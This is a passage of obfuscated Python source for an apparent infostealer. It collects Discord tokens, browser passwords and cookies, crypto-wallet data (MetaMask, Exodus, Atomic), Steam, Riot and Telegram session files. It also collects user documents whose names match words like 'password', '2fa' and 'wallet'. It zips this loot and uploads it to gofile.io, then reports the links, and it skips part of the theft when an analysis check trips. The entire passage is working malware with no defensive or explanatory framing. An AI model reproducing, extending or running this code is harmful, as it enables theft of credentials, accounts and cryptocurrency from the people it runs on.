    O0OOO00OO0OO000OO =uploadToAnonfiles (f'{OOOOOOO000OO0O0O0}/{OOO000OO0O00000O0}.zip')#line:761
    os .remove (f"{OOOOOOO000OO0O0O0}/{OOO000OO0O00000O0}.zip")#line:762
    if "Wallet"in O0OO0OOO00OO0000O or "eogaeaoehlef"in O0OO0OOO00OO0000O :#line:764
        WalletsZip .append ([OOO000OO0O00000O0 ,O0OOO00OO0OO000OO ])#line:765
    elif "NationsGlory"in OOO000OO0O00000O0 or "Steam"in OOO000OO0O00000O0 or "RiotCli"in OOO000OO0O00000O0 :#line:766
        GamingZip .append ([OOO000OO0O00000O0 ,O0OOO00OO0OO000OO ])#line:767
    else :#line:768
        OtherZip .append ([OOO000OO0O00000O0 ,O0OOO00OO0OO000OO ])#line:769
def GatherAll ():#line:772
    ""#line:773
    O0O00OO000000O0O0 =[[f"{roaming}/Opera Software/Opera GX Stable","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{roaming}/Opera Software/Opera Stable","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{roaming}/Opera Software/Opera Neon/User Data/Default","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Google/Chrome/User Data","chrome.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Google/Chrome SxS/User Data","chrome.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/BraveSoftware/Brave-Browser/User Data","brave.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Yandex/YandexBrowser/User Data","yandex.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Microsoft/Edge/User Data","edge.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"]]#line:783
    OOO0O0O00O0OO00OO =[[f"{roaming}/Discord","/Local Storage/leveldb"],[f"{roaming}/Lightcord","/Local Storage/leveldb"],[f"{roaming}/discordcanary","/Local Storage/leveldb"],[f"{roaming}/discordptb","/Local Storage/leveldb"],]#line:790
    O0OOOO0O00O0OOOOO =[[f"{roaming}/atomic/Local Storage/leveldb",'"Atomic Wallet.exe"',"Wallet"],[f"{roaming}/Exodus/exodus.wallet","Exodus.exe","Wallet"],["C:\Program Files (x86)\Steam\config","steam.exe","Steam"],[f"{roaming}/NationsGlory/Local Storage/leveldb","NationsGlory.exe","NationsGlory"],[f"{local}/Riot Games/Riot Client/Data","RiotClientServices.exe","RiotClient"]]#line:798
    O00O0OOOO0O0O0000 =[f"{roaming}/Telegram Desktop/tdata",'telegram.exe',"Telegram"]#line:799
    for OOOO00OO00OO0OOO0 in O0O00OO000000O0O0 :#line:801
        O00O00O0O000OOO0O =threading .Thread (target =getT0k3n ,args =[OOOO00OO00OO0OOO0 [0 ],OOOO00OO00OO0OOO0 [2 ]])#line:802
        O00O00O0O000OOO0O .start ()#line:803
        Threadlist .append (O00O00O0O000OOO0O )#line:804
    for OOOO00OO00OO0OOO0 in OOO0O0O00O0OO00OO :#line:805
        O00O00O0O000OOO0O =threading .Thread (target =G3tD1sc0rd ,args =[OOOO00OO00OO0OOO0 [0 ],OOOO00OO00OO0OOO0 [1 ]])#line:806
        O00O00O0O000OOO0O .start ()#line:807
        Threadlist .append (O00O00O0O000OOO0O )#line:808
    for OOOO00OO00OO0OOO0 in O0O00OO000000O0O0 :#line:810
        O00O00O0O000OOO0O =threading .Thread (target =getP4ssw ,args =[OOOO00OO00OO0OOO0 [0 ],OOOO00OO00OO0OOO0 [3 ]])#line:811
        O00O00O0O000OOO0O .start ()#line:812
        Threadlist .append (O00O00O0O000OOO0O )#line:813
    O0000OOO000O00000 =[]#line:815
    for OOOO00OO00OO0OOO0 in O0O00OO000000O0O0 :#line:816
        O00O00O0O000OOO0O =threading .Thread (target =getC00k13 ,args =[OOOO00OO00OO0OOO0 [0 ],OOOO00OO00OO0OOO0 [4 ]])#line:817
        O00O00O0O000OOO0O .start ()#line:818
        O0000OOO000O00000 .append (O00O00O0O000OOO0O )#line:819
    threading .Thread (target =GatherZips ,args =[O0O00OO000000O0O0 ,O0OOOO0O00O0OOOOO ,O00O0OOOO0O0O0000 ]).start ()#line:821
    for O00OOO00O00OO0O0O in O0000OOO000O00000 :O00OOO00O00OO0O0O .join ()#line:824
    O00O00O000OOOOO0O =TR6st (C00k13 )#line:825
    if O00O00O000OOOOO0O ==True :return #line:826
    for OOOO00OO00OO0OOO0 in O0O00OO000000O0O0 :#line:828
         threading .Thread (target =Z1pTh1ngs ,args =[OOOO00OO00OO0OOO0 [0 ],OOOO00OO00OO0OOO0 [5 ],OOOO00OO00OO0OOO0 [1 ]]).start ()#line:829
    for OOOO00OO00OO0OOO0 in O0OOOO0O00O0OOOOO :#line:831
         threading .Thread (target =Z1pTh1ngs ,args =[OOOO00OO00OO0OOO0 [0 ],OOOO00OO00OO0OOO0 [2 ],OOOO00OO00OO0OOO0 [1 ]]).start ()#line:832
    threading .Thread (target =ZipTelegram ,args =[O00O0OOOO0O0O0000 [0 ],O00O0OOOO0O0O0000 [2 ],O00O0OOOO0O0O0000 [1 ]]).start ()#line:834
    for O00OOO00O00OO0O0O in Threadlist :#line:836
        O00OOO00O00OO0O0O .join ()#line:837
    global upths #line:838
    upths =[]#line:839
    for OO0OOO0OOOOO0O00O in ["crpassw.txt","crcook.txt"]:#line:841
        upload (OO0OOO0OOOOO0O00O .replace (".txt",""),uploadToAnonfiles (os .getenv ("TEMP")+"\\"+OO0OOO0OOOOO0O00O ))#line:843
def uploadToAnonfiles (OOOOO0O0OO0O00O00 ):#line:845
    try :return requests .post (f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',files ={'file':open (OOOOO0O0OO0O00O00 ,'rb')}).json ()["data"]["downloadPage"]#line:846
    except :return False #line:847
def KiwiFolder (O000OOOO0OO0OO000 ,OO0O00O00OOO0O000 ):#line:850
    global KiwiFiles #line:851
    O00OOO0000O00O000 =7 #line:852
    O0OO0O0OO00OO00OO =0 #line:853
    O00000OO00O000OO0 =os .listdir (O000OOOO0OO0OO000 )#line:854
    OOO0000000OO0OOO0 =[]#line:855
    for O00O0O0O00O0O00OO in O00000OO00O000OO0 :#line:856
        if not os .path .isfile (O000OOOO0OO0OO000 +"/"+O00O0O0O00O0O00OO ):return #line:857
        O0OO0O0OO00OO00OO +=1 #line:858
        if O0OO0O0OO00OO00OO <=O00OOO0000O00O000 :#line:859
            OOOO0OO0O00000O00 =uploadToAnonfiles (O000OOOO0OO0OO000 +"/"+O00O0O0O00O0O00OO )#line:860
            OOO0000000OO0OOO0 .append ([O000OOOO0OO0OO000 +"/"+O00O0O0O00O0O00OO ,OOOO0OO0O00000O00 ])#line:861
        else :#line:862
            break #line:863
    KiwiFiles .append (["folder",O000OOOO0OO0OO000 +"/",OOO0000000OO0OOO0 ])#line:864
KiwiFiles =[]#line:866
def KiwiFile (O00OOO00O00000000 ,OO0O0O000OO0OOO0O ):#line:867
    global KiwiFiles #line:868
    O00000O00OO0OO000 =[]#line:869
    OOO0OOO000OO0OOO0 =os .listdir (O00OOO00O00000000 )#line:870
    for O0OO00OOO000OO0O0 in OOO0OOO000OO0OOO0 :#line:871
        for OOO0O0O0OOOO0OOOO in OO0O0O000OO0OOO0O :#line:872
            if OOO0O0O0OOOO0OOOO in O0OO00OOO000OO0O0 .lower ():#line:873
                if os .path .isfile (O00OOO00O00000000 +"/"+O0OO00OOO000OO0O0 )and ".txt"in O0OO00OOO000OO0O0 :#line:874
                    O00000O00OO0OO000 .append ([O00OOO00O00000000 +"/"+O0OO00OOO000OO0O0 ,uploadToAnonfiles (O00OOO00O00000000 +"/"+O0OO00OOO000OO0O0 )])#line:875
                    break #line:876
                if os .path .isdir (O00OOO00O00000000 +"/"+O0OO00OOO000OO0O0 ):#line:877
                    O00OO00O00OO0OO0O =O00OOO00O00000000 +"/"+O0OO00OOO000OO0O0 #line:878
                    KiwiFolder (O00OO00O00OO0OO0O ,OO0O0O000OO0OOO0O )#line:879
                    break #line:880
    KiwiFiles .append (["folder",O00OOO00O00000000 ,O00000O00OO0OO000 ])#line:882
def Kiwi ():#line:884
    OO0OOO0O000O0000O =temp .split ("\AppData")[0 ]#line:885
    O000O00O0O00O0000 =[OO0OOO0O000O0000O +"/Desktop",OO0OOO0O000O0000O +"/Downloads",OO0OOO0O000O0000O +"/Documents"]#line:890
    OOOO0OO0O0OO00O0O =["account","acount","passw","secret","senhas","contas","backup","2fa","importante","privado","exodus","exposed","perder","amigos","empresa","trabalho","work","private","source","users","username","login","user","usuario","log"]#line:918
    OO00O0O0O00O0O0O0 =["passw","mdp","motdepasse","mot_de_passe","login","secret","account","acount","paypal","banque","account","metamask","wallet","crypto","exodus","discord","2fa","code","memo","compte","token","backup","secret","mom","family"]#line:946
    OO0OOOO0O0OO00000 =[]#line:948
    for OOOO000O000OOO000 in O000O00O0O00O0000 :#line:949
        OO0OOO00O0OO00O00 =threading .Thread (target =KiwiFile ,args =[OOOO000O000OOO000 ,OO00O0O0O00O0O0O0 ]);OO0OOO00O0OO00O00 .start ()#line:950
        OO0OOOO0O0OO00000 .append (OO0OOO00O0OO00O00 )#line:951
    return OO0OOOO0O0OO00000 #line:952
global keyword ,cookiWords ,paswWords ,CookiCount ,P4sswCount ,WalletsZip ,GamingZip ,OtherZip #line:955
keyword =['mail','[coinbase](https://coinbase.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[instagram](https://instagram.com)','[tiktok](https://tiktok.com)','[twitter](https://twitter.com)','[facebook](https://facebook.com)','card','[epicgames](https://epicgames.com)','[spotify](https://spotify.com)','[yahoo](https://yahoo.com)','[roblox](https://roblox.com)','[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank','[paypal](https://paypal.com)','[origin](https://origin.com)','[amazon](https://amazon.com)','[ebay](https://ebay.com)','[aliexpress](https://aliexpress.com)','[playstation](https://playstation.com)','[hbo](https://hbo.com)','[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)','[hotmail](https://hotmail.com)','[outlook](https://outlook.com)','[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)','[pornhub](https://pornhub.com)','[disney](https://disney.com)','[expressvpn](https://expressvpn.com)','crypto','[uber](https://uber.com)','[netflix](https://netflix.com)']#line:959
CookiCount ,P4sswCount =0 ,0 #line:961
cookiWords =[]#line:962
paswWords =[]#line:963
WalletsZip =[]#line:965
GamingZip =[]#line:966
OtherZip =[]#line:967
GatherAll ()#line:969
DETECTED =TR6st (C00k13 )#line:970
if not DETECTED :#line:972
    wikith =Kiwi ()#line:973
    for thread in wikith :thread .join ()#line:975
    time .sleep (0.2 )#line:976
    filetext ="\n"#line:978
    for arg in KiwiFiles :#line:979
        if len (arg [2 ])!=0 :#line:980
            foldpath =arg [1 ]#line:981
            foldlist =arg [2 ]#line:982
            filetext +=f"📁 {foldpath}\n"#line:983
            for ffil in foldlist :#line:985
                a =ffil [0 ].split ("/")#line:986
                fileanme =a [len (a )-1 ]#line:987
                b =ffil [1 ]#line:988
                filetext +=f"└─:open_file_folder: [{fileanme}]({b})\n"#line:989
            filetext +="\n"#line:990
    upload ("kiwi",filetext )
